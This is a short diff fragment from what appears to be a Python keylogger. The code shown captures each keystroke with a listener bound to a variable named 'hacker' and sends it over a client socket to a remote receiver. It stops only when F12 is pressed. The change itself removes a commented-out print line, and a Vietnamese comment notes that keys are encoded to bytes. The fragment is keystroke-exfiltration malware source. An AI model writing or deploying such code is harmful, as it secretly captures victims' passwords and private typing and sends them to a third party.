@@ -14,7 +14,6 @@ def on_press(key):
     if key == "Key.f12":
         raise SystemExit(0)
     clientSocket.send(key.encode('utf-8')) #mã hóa key thành dạng byte
-    # print(key , end = '')
 
 
 with  Listener(on_press =  on_press) as hacker:         
